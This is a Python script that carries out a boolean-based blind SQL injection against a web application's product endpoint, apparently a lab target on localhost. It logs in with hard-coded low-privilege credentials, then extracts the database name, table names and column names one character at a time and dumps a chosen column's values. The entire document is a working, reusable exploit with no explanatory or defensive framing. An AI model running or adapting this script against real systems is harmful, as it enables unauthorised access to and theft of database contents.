import requests
import sys
import string

chars = string.ascii_letters + string.digits + "_"
url = "http://127.0.0.1:4444"

login_data = {
	"username": "aydin",
	"password": "Pass4Aydin"
}

print("Login with low privileged user...")

session = requests.session()
response = session.post(url + "/login", json=login_data)
if "Welcome" not in response.text:
	print("Login Failed")
	sys.exit(0)
else:
	print("Login Successful !", end="\n\n\n")

print("Checking product endpoint")
product_endpoint = url + "/products/"
response = session.get(product_endpoint + "1")
if response.status_code == 200:
	print("Product endpoint is available !", end="\n\n\n")
else:
	print("Product endpoint is not available !")
	sys.exit(0)



database_name_count = 1

print("Getting length of database name ...")

while True:
	payload = f"(select length(database()))={database_name_count}"
	query = f"1' and {payload} -- -"
	response = session.get(product_endpoint + query)
	if "No product" not in response.text:
		print(f"Length of Database Name: {database_name_count}") 
		break
	else:
		database_name_count += 1


print("Getting database name ...")

database_name = ""

count = 1
while True:
	for char in chars:
		payload = f"substring((select database()),{count},1)='{char}'"
		query = f"1' and {payload} -- -"
		response = session.get(product_endpoint + query)
		if "No product" not in response.text:
			database_name += char
			count += 1
			break
	if count > database_name_count:
		break


print("Database Name: " + database_name, end="\n\n\n")


print("Getting number of tables ...")

table_count = 1

while True:
        payload = f"(select count(table_name) from information_schema.tables where table_schema='{database_name}')={table_count}"
        query = f"1' and {payload} -- -"
        response = session.get(product_endpoint + query)
        if "No product" not in response.text:
                print(f"Number of tables in {database_name}: {table_count}", end="\n\n\n")
                break
        else:
                table_count += 1


tables = []

for i in range(table_count):
	len_of_table = 1
	while True:
		payload = f"(select length(table_name) from information_schema.tables where table_schema='{database_name}' limit {i},1)={len_of_table}"
		query = f"1' and {payload} -- -"
		response = session.get(product_endpoint + query)
		if "No product" not in response.text:
			print(f"Length of {i+1}. table name: {len_of_table}")
			break
		else:
			len_of_table += 1

	print("Getting table name ...")
	table_name = ""
	count = 1
	while True:
		for char in chars:
			payload = f"substring((select table_name from information_schema.tables where table_schema='{database_name}' limit {i},1),{count},1)='{char}'"
			query =f"1' and {payload} -- -"
			response = session.get(product_endpoint + query)
			if "No product" not in response.text:
				table_name += char
				count += 1
				break
		if count > len_of_table:
			break
	tables.append(table_name)
	print(f"{i+1}. Table: {table_name}", end="\n\n")


table_num = int(input("Choose table:"))	

table_name = tables[table_num - 1]

print(f"Getting number of columns in {table_name}")

column_count = 1

while True:
	payload = f"(select count(column_name) from information_schema.columns where table_name='{table_name}' and table_schema='{database_name}')={column_count}"
	query = f"1' and {payload} -- -"
	response = session.get(product_endpoint + query)
	if "No product" not in response.text:
		print(f"Number of columns in {table_name}: {column_count}", end="\n\n\n")
		break
	else:
		column_count += 1


columns = []
for i in range(column_count):
	len_of_column = 1
	while True:
		payload = f"(select length(column_name) from information_schema.columns where table_name='{table_name}' and table_schema='{database_name}' limit {i},1)={len_of_column}"
		query = f"1' and {payload} -- -"
		response = session.get(product_endpoint + query)
		if "No product" not in response.text:
			print(f"Length of {i+1}. column name: {len_of_column}")
			break
		else:
			len_of_column += 1

	print("Getting column name ...")
	column_name = ""
	count = 1
	while True:
		for char in chars:
			payload = f"substring((select column_name from information_schema.columns where table_name='{table_name}' and table_schema='{database_name}' limit {i},1),{count},1)='{char}'"
			query =f"1' and {payload} -- -"
			response = session.get(product_endpoint + query)
			if "No product" not in response.text:
				column_name += char
				count += 1
				break
		if count > len_of_column:
			break
	columns.append(column_name)
	print(f"{i+1}. Column: {column_name}", end="\n\n")

while True:
	column_num = int(input("Choose column you want to retrieve:"))
	column_name = columns[column_num - 1]
	len_of_value = 1
	while True:
		payload = f"(select length({column_name}) from {table_name} limit 0,1)={len_of_value}"
		query = f"1' and {payload} -- -"
		response = session.get(product_endpoint + query)
		if "No product" not in response.text:
			print(f"Length of {column_name}: {len_of_value}")
			break
		else:
			len_of_value += 1


	print(f"Getting {column_name}'s value")
	column_value = ""
	count = 1
	while True:
		for char in chars:
			payload = f"substring((select {column_name} from {table_name} limit 0,1),{count},1)='{char}'"
			query =f"1' and {payload} -- -"
			response = session.get(product_endpoint + query)
			if "No product" not in response.text:
				column_value += char
				count += 1
				break
		if count > len_of_value:
			break
	print(f"{column_name}: {column_value}")